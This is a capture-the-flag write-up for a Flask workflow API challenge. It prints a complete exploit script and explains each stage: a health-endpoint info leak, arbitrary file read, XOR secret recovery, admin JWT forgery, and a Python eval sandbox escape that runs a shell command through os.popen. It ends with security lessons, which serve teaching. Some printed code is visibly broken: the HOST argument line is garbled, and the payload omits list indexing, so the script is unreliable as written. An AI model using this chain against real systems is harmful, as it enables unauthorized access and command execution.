# Challenge - Ni8mare Lite 

- Name: Ni8mare Lite  
- Category: API  
- Difficulty: Hard  

Ni8mare Lite is a hard API challenge built around a Flask‑based workflow automation platform inspired by FlowForge. The platform exposes several REST endpoints for health checks, webhook processing, workflow evaluation, and JWT‑based auth. By chaining multiple design flaws — a **timestamp info leak**, a **file‑read primitive**, a weak **XOR “encoding” of the session secret**, and a broken **Python sandbox** — we can forge an admin JWT, escape the sandbox, and read the flag file. This writeup shows the full chain using my exploit script.

---

## 1. Platform Overview

The service is a workflow engine exposing endpoints roughly like:

- `/api/health` — public health check with system metadata.
- `/api/webhooks/trigger` — unauthenticated webhook/file processing.
- `/api/auth/verify` — verify JWTs.
- `/api/workflows/evaluate` — protected expression evaluator (Python `eval` sandbox).
- Other JWT‑protected endpoints (debug/import/notifications) that are decoys.

Key behaviors:

- On startup, the app generates a random `SESSION_SECRET` and stores a **XOR‑encoded** version in `/app/.internal/config.json`.
- It also stores a `BOOT_TIMESTAMP` (integer) in app config.
- JWTs for API auth use HS256 with `SESSION_SECRET` as the HMAC key, and the `role` claim gates admin‑only routes like `/api/workflows/evaluate`.
- The expression evaluator is a “sandboxed” `eval` with a custom `__builtins__` and regex‑based blocklist — but it still exposes `getattr`, making it escapable.

The flag is written at container start to `/flag_<random>.txt` with world‑readable permissions.

---

## 2. My Exploit Script

Here is the script I used to solve the challenge end‑to‑end:

```python
#!/usr/bin/env python3
import sys
import json
import hmac
import base64
import hashlib
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = sys.argv.rstrip("/") if len(sys.argv) > 1 else "https://INSTANCE.chal.ctf.ae"[1]


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt(secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "ctf", "role": "admin"}

    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())

    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()

    return f"{h}.{p}.{b64url(sig)}"


def post_json(path, data, token=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    r = requests.post(
        HOST + path,
        json=data,
        headers=headers,
        verify=False,
        timeout=15
    )

    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text


print(f"[+] Target: {HOST}")

# 1. Leak boot timestamp
health = requests.get(HOST + "/api/health", verify=False, timeout=15).json()
boot = health["started_at"]
print(f"[+] started_at: {boot}")

# 2. LFI: read internal config
status, cfg = post_json(
    "/api/webhooks/trigger",
    {
        "workflow_id": "x",
        "files": [
            {"path": "/app/.internal/config.json"}
        ]
    }
)

if status != 200:
    print("[-] Failed reading config:", status, cfg)
    sys.exit(1)

preview = cfg["file_metadata"]["metadata"]["preview"]
secret_enc = json.loads(preview)["session_secret"]
print(f"[+] Encoded secret: {secret_enc}")

# 3. Decode XOR secret
cipher = bytes.fromhex(secret_enc)
key = hashlib.sha256(str(boot).encode()).digest()

secret = bytes(
    c ^ key[i % len(key)]
    for i, c in enumerate(cipher)
).decode()

print(f"[+] Decoded JWT secret: {secret}")

# 4. Forge admin JWT
token = make_jwt(secret)
print(f"[+] Admin JWT: {token}")

# Optional verification
status, verify = post_json("/api/auth/verify", {"token": token})
print(f"[+] Verify: {verify}")

# 5. Sandbox escape + read flag
payload = r"""
c=[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings']
m=c.__init__.__globals__['sys'].modules[chr(111)+chr(115)]
print(m.popen('cat /flag_*.txt').read())
""".strip()

status, out = post_json(
    "/api/workflows/evaluate",
    {"expression": payload},
    token=token
)

print("[+] Eval response:")
print(json.dumps(out, indent=2))

if isinstance(out, dict) and out.get("result"):
    print("\n[+] FLAG:")
    print(out["result"])
```

It performs five main steps:

1. Leak `started_at` (boot timestamp).
2. Abuse file‑read via `/api/webhooks/trigger` to read internal config.
3. XOR‑decode the stored `session_secret` using `SHA-256(boot_timestamp)` as key.
4. Forge an admin JWT using HS256.
5. Escape the Python sandbox and read `/flag_*.txt`.

---

## 3. Stage 1 — Health Info Leak: Recover BOOT Timestamp

The public health endpoint returns system info, including the boot time:

```python
health = requests.get(HOST + "/api/health", verify=False, timeout=15).json()
boot = health["started_at"]
print(f"[+] started_at: {boot}")
```

Typical JSON response:

```json
{
  "status": "healthy",
  "started_at": 1783188742,
  "version": "2.1.0",
  "environment": "production"
}
```

This `started_at` (or `boot_timestamp`) is the exact value used when generating the XOR key for the session secret at startup. On its own, this seems harmless — but it becomes critical in the next step.

---

## 4. Stage 2 — File Read via `/api/webhooks/trigger`

The webhook trigger endpoint accepts a JSON body with a `files` array containing `path` fields, and returns metadata plus a preview of each file:

```python
status, cfg = post_json(
    "/api/webhooks/trigger",
    {
        "workflow_id": "x",
        "files": [
            {"path": "/app/.internal/config.json"}
        ]
    }
)
```

Server behavior:

- Reads the file at the given path (after some basic validation).
- Builds metadata including size, readability, etc.
- Reads up to 512 bytes and returns them as `preview`.

Our script extracts:

```python
preview = cfg["file_metadata"]["metadata"]["preview"]
secret_enc = json.loads(preview)["session_secret"]
print(f"[+] Encoded secret: {secret_enc}")
```

The `config.json` looks like:

```json
{
  "session_secret": "<xor_encoded_hex>",
  "version": "2.1.0"
}
```

We now have:

- `boot` (from health).
- `session_secret` in **XOR‑encoded hex** form (from config preview).

---

## 5. Stage 3 — XOR Decoding the Session Secret

On startup, the app:

- Generates `session_secret = os.urandom(24).hex()` → 48‑char hex string.
- Computes `key = SHA-256(str(boot_timestamp))` (32‑byte digest).
- XOR‑encodes the ASCII secret against this key (wrapping modulo key length).
- Stores the resulting bytes as hex in `config.json`.

To reverse this:

```python
cipher = bytes.fromhex(secret_enc)
key = hashlib.sha256(str(boot).encode()).digest()

secret = bytes(
    c ^ key[i % len(key)]
    for i, c in enumerate(cipher)
).decode()

print(f"[+] Decoded JWT secret: {secret}")
```

Explanation:

- `cipher` is the XOR‑encoded bytes (48 bytes).
- `key` is the 32‑byte SHA‑256 digest of the boot timestamp string.
- We XOR each byte with the corresponding key byte (index modulo 32).
- The output `secret` is the original `SESSION_SECRET` (ASCII hex string).

This shows the flaw: XOR is reversible, and both operands (`boot`, encoded secret) are exposed via the API. The “encoding” provides zero real security.

---

## 6. Stage 4 — Forging an Admin JWT

With the session secret, we can create arbitrary HS256 JWTs. The app’s auth layer:

- Expect HS256 JWT with `SESSION_SECRET`.
- Decode token, set user context (`g.user`, `g.role`).
- Require `role == "admin"` for `/api/workflows/evaluate`.

Our script builds a minimal JWT manually:

```python
def make_jwt(secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "ctf", "role": "admin"}

    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())

    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()

    return f"{h}.{p}.{b64url(sig)}"

token = make_jwt(secret)
print(f"[+] Admin JWT: {token}")
```

We can optionally verify it via `/api/auth/verify`:

```python
status, verify = post_json("/api/auth/verify", {"token": token})
print(f"[+] Verify: {verify}")
```

Now we have an `Authorization: Bearer <token>` that is treated as an **admin** by the backend.

---

## 7. Stage 5 — Sandbox Escape and Flag Read

The target endpoint is `/api/workflows/evaluate`:

- Requires a valid JWT with `role: "admin"`.
- Takes `{"expression": "<python code>"}`.
- Applies a regex blocklist to the raw expression string (blacklist `os`, `__import__`, `open`, `exec`, etc. with `\b` anchors).
- Constructs a sandbox env:

  ```python
  sandbox = {"__builtins__": SANDBOX_BUILTINS}
  result = eval(expr, sandbox)
  ```

- `SANDBOX_BUILTINS` includes `getattr`, `print`, `type`, etc., but not `__import__`, `os`, `open`, etc.

The blocklist is fragile:

- Uses `\b` word boundaries — which don’t match inside dunder names or combined tokens.
- Checks only the literal string before evaluation, not the result of concatenations.

My payload:

```python
payload = r"""
c=[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings']
m=c.__init__.__globals__['sys'].modules[chr(111)+chr(115)]
print(m.popen('cat /flag_*.txt').read())
""".strip()
```

Explanation:

1. `( )` is an empty tuple; `().__class__` is `<class 'tuple'>`, whose base is `object`.
   - `( ).__class__.__base__.__subclasses__()` returns the list of **all subclasses of `object`**.
2. We list‑comprehend to find the subclass named `catch_warnings`:

   ```python
   c = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings']
   ```

   `catch_warnings` is a built‑in class from Python’s warnings machinery; its `__init__` globals include `sys`.

3. Access its `__init__.__globals__` to get the `sys` module:

   ```python
   m = c.__init__.__globals__['sys'].modules[chr(111)+chr(115)]
   ```

   - `chr(111)+chr(115)` builds the string `"os"` without the literal `os` appearing, dodging `\bos\b`.
   - `sys.modules['os']` gives us the `os` module.

4. Use `os.popen('cat /flag_*.txt').read()` to read the flag file:

   ```python
   print(m.popen('cat /flag_*.txt').read())
   ```

Why this bypasses the blocklist:

- `os` never appears as a whole word; we construct it dynamically with `chr(111)+chr(115)`.
- We avoid `__import__` entirely by piggybacking on `sys.modules`.
- `popen` is not blocked (only `open` is, via `\bopen\b`).
- Dunder names like `__globals__` bypass `\bglobals\b` because underscores are word characters, so there’s no word boundary where the regex expects it.

The script sends:

```python
status, out = post_json(
    "/api/workflows/evaluate",
    {"expression": payload},
    token=token
)

print("[+] Eval response:")
print(json.dumps(out, indent=2))

if isinstance(out, dict) and out.get("result"):
    print("\n[+] FLAG:")
    print(out["result"])
```

The response includes `result` containing the flag output.

---

## 8. End‑to‑End Attack Chain

Putting it together:

1. **Health info leak**:
   - GET `/api/health` → `started_at` / `boot_timestamp`.
2. **File read**:
   - POST `/api/webhooks/trigger` with `{"files":[{"path":"/app/.internal/config.json"}]}` → reads internal config, including XOR‑encoded `session_secret`.
3. **XOR decoding**:
   - Compute `key = SHA-256(str(started_at))`.
   - XOR decode `session_secret` bytes with key to recover **SESSION_SECRET**.
4. **JWT forgery**:
   - Build HS256 JWT with header `{"alg": "HS256"}` and payload `{"user": "ctf", "role": "admin"}` using `SESSION_SECRET` as HMAC key.
   - Use `Authorization: Bearer <token>` in subsequent requests.
5. **Sandbox escape**:
   - POST `/api/workflows/evaluate` with the `catch_warnings`/`sys.modules['os']` payload.
   - Read `/flag_*.txt` and return it in `result`.

The script automates these steps so the whole exploit is a single run.

---

## 9. Lessons Learned

- **Info leaks are dangerous**: A seemingly harmless `started_at` field becomes the key to reversing the XOR “protection” of the session secret.
- **XOR is not encryption**: If both the XOR key and ciphertext are exposed, the underlying secret is trivially recoverable.
- **File‑read primitives matter**: Allowing untrusted paths in an endpoint that reads files and returns previews can leak secrets from “internal” directories.
- **JWT security depends on key secrecy**: Once the signing key is recoverable, JWT‑based auth and roles collapse completely.
- **Python sandboxing is hard**: Including `getattr` and relying on regex blacklists makes the sandbox fundamentally unsafe; Python’s object graph (`__class__`, `__mro__`, `__subclasses__`, `__globals__`) is extremely powerful for escapes.
- **Blocklists with `\b` are fragile**: Word‑boundary‑based regex blocklists are easily bypassed via concatenation and dunder names; allowlists and strict sandboxes (or no dynamic `eval` at all) are the only safe route.

Ni8mare Lite is a great demonstration of how several “minor” design choices — metadata leakage, ad‑hoc encoding, permissive file APIs, and loose sandboxing — can chain together into a full compromise of an API‑driven platform.
